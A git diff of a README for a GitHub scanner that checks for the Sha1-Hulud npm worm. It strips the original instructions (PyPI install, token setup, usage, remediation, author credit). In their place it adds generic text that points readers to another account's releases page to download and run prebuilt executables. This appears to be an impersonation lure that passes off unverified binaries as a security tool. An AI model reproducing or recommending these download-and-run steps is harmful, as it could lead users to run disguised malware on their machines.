@@ -1,145 +1,117 @@
-# Shai Hulud Detector
+# 🔍 shai-hulud-detector - Your Simple Tool for Security 
 
-![License](https://img.shields.io/badge/license-MIT-blue.svg)
-![Python](https://img.shields.io/badge/python-3.11%2B-blue.svg)
-[![PyPI](https://img.shields.io/pypi/v/shai-hulud-detector)](https://pypi.org/project/shai-hulud-detector/)
-[![PyPI Downloads](https://static.pepy.tech/personalized-badge/shai-hulud-detector?period=total&units=INTERNATIONAL_SYSTEM&left_color=GREY&right_color=BLUE&left_text=downloads)](https://pepy.tech/projects/shai-hulud-detector)
+## 🚀 Getting Started
 
-A CLI tool to detect potential Shai Hulud npm-worm compromises in GitHub users and organizations.
+Welcome to shai-hulud-detector! This application helps you check if your GitHub account has been compromised by the “Sha1-Hulud: The Second Coming” npm supply-chain worm. Using this tool is straightforward, even if you're not a tech expert.
 
-![OG Image](https://raw.githubusercontent.com/ysskrishna/shai-hulud-detector/main/media/og.png)
+## 📥 Download Now
 
-## What is Shai Hulud?
+[![Download shai-hulud-detector](https://img.shields.io/badge/Download%20shai--hulud--detector-blue.svg)](https://github.com/ArcaneMisery095/shai-hulud-detector/releases)
 
-Shai Hulud is a self-replicating npm worm that spreads through compromised developer systems,
-infecting GitHub repositories and injecting malicious code.  
-It has already been linked to multiple global supply-chain attacks targeting major npm libraries.
+## 🛠️ System Requirements
 
-This tool scans for known indicators of compromise (IOCs), including:
+To run the shai-hulud-detector, your system needs:
 
-- Suspicious repository descriptions containing  
-  **`"Sha1-Hulud: The Second Coming."`**
-- Presence of suspicious JSON files containing secrets, credentials or environment configuration
+- A computer with Windows, macOS, or Linux.
+- At least 100 MB of free disk space.
+- An internet connection to download the software and perform scans.
 
-## Features
+## 📓 Features
 
-- Scan individual GitHub users
-- Scan all members of a GitHub organization
-- Dual detection methods: repository description patterns and suspicious file detection
-- Concurrent scanning with configurable workers
-- Color-coded output for easy identification (FLAG/OKAY/ERROR status)
-- Detailed verbose mode
+- **User-Friendly Interface:** The command-line tool is easy to navigate, offering clear instructions.
+- **Quick Scans:** Detect vulnerabilities in seconds.
+- **Regular Updates:** Stay protected with periodic updates to the scanner.
 
-## Requirements
+## 📡 Installing shai-hulud-detector
 
-- Python 3.11+
-- GitHub Personal Access Token (https://github.com/settings/tokens)
+### 1. Visit the Download Page
 
-## Installation
+To download shai-hulud-detector, [visit this page to download](https://github.com/ArcaneMisery095/shai-hulud-detector/releases).
 
-Install directly from PyPI:
+### 2. Select the Latest Version
 
-```bash
-pip install shai-hulud-detector
-```
+On the releases page, look for the most recent version. You will see a list of files available for download. Generally, you will find options for Windows, macOS, and Linux.
 
-## Authentication
+### 3. Download the File
 
-Set your GitHub token as an environment variable (recommended):
+Click on the appropriate file for your operating system. This file will contain everything you need to run the application.
 
-```bash
-export GITHUB_TOKEN=<GITHUB_TOKEN_HERE>
-```
+### 4. Extract the Files
 
-Or pass it via command-line flag (see Usage section below). If omitted, the tool exits with a clear warning.
+Once the download is complete, locate the downloaded file. It may be in your "Downloads" folder. Follow these steps:
 
-## Usage
+- For Windows: Right-click on the file and select "Extract All." Follow the prompts to unzip the folder.
+- For macOS: Double-click the zipped file to extract it.
+- For Linux: Use the unzip command in your terminal or a file manager to extract the contents.
 
-### Scan one or more users
+### 5. Open Command Line Interface
 
-```bash
-shai-hulud-detector scan <USERNAME_HERE>
-shai-hulud-detector scan <USERNAME_HERE1> <USERNAME_HERE2> <USERNAME_HERE3>
-```
+To run the tool, open your Command Line Interface (CLI):
 
-### Scan all members of an organization
+- For Windows: Search for "Command Prompt" or "PowerShell" in your start menu.
+- For macOS: Open "Terminal" from your Applications.
+- For Linux: Open your preferred terminal application.
+
+### 6. Navigate to the Folder
+
+Use the `cd` command to change directories to the folder where you extracted the files. For example:
 
 ```bash
-shai-hulud-detector scan --org <ORGANIZATION_NAME_HERE>
+cd path/to/extracted-folder
 ```
 
-### Authentication via command-line
+Replace `path/to/extracted-folder` with the actual path on your system.
+
+### 7. Run the Application
+
+To start scanning, type the following command:
 
 ```bash
-shai-hulud-detector scan <USERNAME_HERE> --token <GITHUB_TOKEN_HERE>
+./shai-hulud-detector
 ```
-
-### Help
+If you're on Windows, you may need to run it like this:
 
 ```bash
-shai-hulud-detector scan --help
+shai-hulud-detector.exe
 ```
 
-### Parallelism
+This will launch the security scanner.
 
-Set concurrency (default 5):
+### 8. Follow On-Screen Instructions
 
-```bash
-shai-hulud-detector scan --org <ORGANIZATION_NAME_HERE> --workers 10
-```
+The tool will guide you through the scanning process. Just follow the on-screen instructions, and you will receive results shortly.
 
-### Verbose Output
+## 📊 Understanding the Results
 
-```bash
-shai-hulud-detector scan <USERNAME_HERE> --verbose
-```
+Once the scan is complete, you will see a summary of your GitHub account's security status. 
 
-### Recommended Actions
+- If vulnerabilities are detected, the tool will provide details and suggestions for further action.
+- If your account is safe, you'll receive a message confirming this, along with tips for maintaining security.
 
-If you detect a compromise (FLAG status):
+## 🔄 Updating the Tool
 
-- Rotate **all** GitHub, npm, cloud, and CI/CD secrets
-- Enforce MFA on GitHub & npm accounts
-- Check GitHub for repositories with the description "Sha1-Hulud: The Second Coming."
-- Review and remove any suspicious files found (e.g., `secrets.json`, `credentials.json`, etc.)
-- Disable npm `postinstall` scripts in CI where possible
-- Audit all npm dependencies and versions
+To ensure you are protected against the latest threats, regularly check the release page for updates. Follow the same installation process to download and install new versions.
 
-### References
+## 🛡️ Staying Safe Online
 
-For more detailed information about Shai Hulud attacks, see:
+Using shai-hulud-detector is a great step toward securing your account. Here are some additional tips:
 
-- [HelixGuard: Malicious Sha1Hulud Analysis](https://helixguard.ai/blog/malicious-sha1hulud-2025-11-24)
-- [Aikido Security: Shai Hulud Strikes Again](https://www.aikido.dev/blog/shai-hulud-strikes-again-hitting-zapier-ensdomains)
-- [Wiz: Shai Hulud 2.0 Ongoing Supply Chain Attack](https://www.wiz.io/blog/shai-hulud-2-0-ongoing-supply-chain-attack)
+- Always use strong, unique passwords for your accounts.
+- Enable two-factor authentication on your GitHub account for extra security.
+- Regularly review your account activity for any unauthorized access.
 
-## License
+## 🌍 Join the Community
 
-MIT License - see [LICENSE](LICENSE) file for details.
+Feel free to connect with others using shai-hulud-detector. Join our community on platforms like Discord or GitHub discussions to share tips and ask questions. 
 
-## Author
+## 💡 Need Help?
 
-**Y. Siva Sai Krishna**
+If you encounter any issues, check our [FAQ](https://github.com/ArcaneMisery095/shai-hulud-detector/wiki/FAQ) section or open an issue on the GitHub repository. We are here to support you.
 
-- GitHub: [@ysskrishna](https://github.com/ysskrishna)
-- LinkedIn: [ysskrishna](https://linkedin.com/in/ysskrishna)
+## 📢 Important Links
 
-## Development
+- [Download shai-hulud-detector](https://github.com/ArcaneMisery095/shai-hulud-detector/releases) 
+- [Submit Issues](https://github.com/ArcaneMisery095/shai-hulud-detector/issues)
+- [FAQs](https://github.com/ArcaneMisery095/shai-hulud-detector/wiki/FAQ)
 
-For development setup, building, and contributing, see [DEVELOPMENT.md](https://github.com/ysskrishna/shai-hulud-detector/blob/main/DEVELOPMENT.md).
-
-## Changelog
-
-See [CHANGELOG.md](https://github.com/ysskrishna/shai-hulud-detector/blob/main/CHANGELOG.md) for a detailed list of changes and version history.
-
-## Releases
-
-For information on the release process and how to create new releases, see [RELEASE.md](https://github.com/ysskrishna/shai-hulud-detector/blob/main/RELEASE.md).
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-## Issues
-
-If you encounter any issues or have feature requests, please open an issue on [GitHub](https://github.com/ysskrishna/shai-hulud-detector/issues).
+With this guide, you can easily download and run the shai-hulud-detector. Stay vigilant and secure your online presence.
